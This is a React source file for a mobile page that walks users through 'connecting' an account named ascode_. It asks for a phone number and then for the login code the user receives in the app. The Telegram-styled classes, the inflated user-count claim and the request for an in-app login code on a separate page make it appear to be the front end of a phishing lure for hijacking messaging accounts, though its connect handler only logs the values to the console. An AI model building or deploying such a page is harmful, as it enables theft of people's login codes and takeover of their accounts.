import { StatusBar } from "@/components/status-bar";
import { ProgressBar } from "@/components/progress-bar";
import { StepCard } from "@/components/step-card";
import { useState, useRef, useEffect } from "react";
import { countries, getCountryByDialCode, Country } from "@/data/countries";

export default function Home() {
  const [countryCode, setCountryCode] = useState('+1');
  const [selectedCountry, setSelectedCountry] = useState<Country>(countries[0]); // Default to US
  const [phoneNumber, setPhoneNumber] = useState('123 456 7890');
  const [codeDigits, setCodeDigits] = useState(['1', '5', '9', '2', '3']);
  const [activeDigit, setActiveDigit] = useState(0);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  const handleConnect = () => {
    console.log('Connecting to ascode_...');
    console.log('Phone:', countryCode + phoneNumber);
    console.log('Code:', codeDigits.join(''));
  };

  const handleCodeInput = (index: number, value: string) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newDigits = [...codeDigits];
      newDigits[index] = value;
      setCodeDigits(newDigits);
      
      // Move to next input if value is entered
      if (value && index < 4) {
        inputRefs.current[index + 1]?.focus();
        setActiveDigit(index + 1);
      }
    }
  };

  const handleCodeKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
      setActiveDigit(index - 1);
    }
  };

  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const match = cleaned.match(/^(\d{3})(\d{3})(\d{4})$/);
    if (match) {
      return `${match[1]} ${match[2]} ${match[3]}`;
    }
    return value;
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 10) {
      setPhoneNumber(formatPhoneNumber(cleaned));
    }
  };

  const handleCountryCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newCode = e.target.value;
    setCountryCode(newCode);
    
    // Find matching country
    const matchingCountry = getCountryByDialCode(newCode);
    if (matchingCountry) {
      setSelectedCountry(matchingCountry);
    }
  };

  return (
    <div className="bg-black text-white min-h-screen">
      <StatusBar />
      <ProgressBar />
      
      {/* Main Content */}
      <div className="px-4 pb-8">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-3xl font-extrabold text-white mb-4 leading-tight">
            Final Step: Connect Your ascode_ Account
          </h1>
          <p className="text-base text-text-secondary leading-relaxed mb-6">
            You're just one step away from unlocking all the features ascode_ has to offer!
          </p>
          <p className="text-lg font-semibold">
            <span className="text-white">Trusted by </span>
            <span className="text-light-blue">3,000,000+ happy users</span>
          </p>
        </div>
        
        {/* Step 1 Card */}
        <StepCard
          stepNumber={1}
          label={<><span className="text-light-gray">→</span> Log in with your phone number</>}
        >
          <div className="flex items-center mb-4">
            <span className="text-2xl mr-3">{selectedCountry.flag}</span>
            <span className="text-telegram-blue font-medium">{selectedCountry.name}</span>
          </div>
          
          <div className="flex items-center space-x-3">
            <input 
              type="text" 
              className="bg-gray-800 rounded-lg px-3 py-4 text-white font-mono text-lg w-20 text-center outline-none border border-gray-600 focus:border-telegram-blue transition-colors"
              value={countryCode}
              onChange={handleCountryCodeChange}
              placeholder="+1"
            />
            <input 
              type="tel" 
              className="phone-input flex-1" 
              value={phoneNumber}
              onChange={handlePhoneChange}
              placeholder="123 456 7890"
            />
          </div>
        </StepCard>
        
        {/* Step 2 Card */}
        <StepCard
          stepNumber={2}
          label={<><span className="text-light-gray">→</span> Receive login code in <span className="text-telegram-blue ml-1">🔷 ascode_</span></>}
        >
          <div className="flex items-center mb-4">
            <div className="w-12 h-12 bg-gradient-to-br from-gold-primary to-gold-secondary rounded-full flex items-center justify-center mr-3 relative">
              <div className="logo-triangle scale-75"></div>
              <div className="verified-badge">✓</div>
            </div>
            <div>
              <div className="text-white font-medium">ascode_</div>
              <div className="text-sm text-text-secondary">
                <span className="text-light-gray">ascode_ login code:</span> <span className="text-telegram-blue font-mono">15923</span>
              </div>
            </div>
          </div>
        </StepCard>
        
        {/* Step 3 Card */}
        <StepCard
          stepNumber={3}
          label={<><span className="text-light-gray">→</span> Enter the code in <span className="text-white ml-1">🔷 ascode_</span></>}
          showConnector={false}
        >
          <div className="flex justify-center space-x-3 mt-6">
            {codeDigits.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                maxLength={1}
                className={`code-digit ${index === activeDigit ? 'active' : ''} text-center outline-none cursor-pointer`}
                value={digit}
                onChange={(e) => handleCodeInput(index, e.target.value)}
                onKeyDown={(e) => handleCodeKeyDown(index, e)}
                onFocus={() => setActiveDigit(index)}
                placeholder=""
              />
            ))}
          </div>
        </StepCard>
        
        {/* Connect Button */}
        <div className="mt-8">
          <button className="connect-btn" onClick={handleConnect}>
            Connect ascode_ Account
          </button>
        </div>
      </div>
    </div>
  );
}
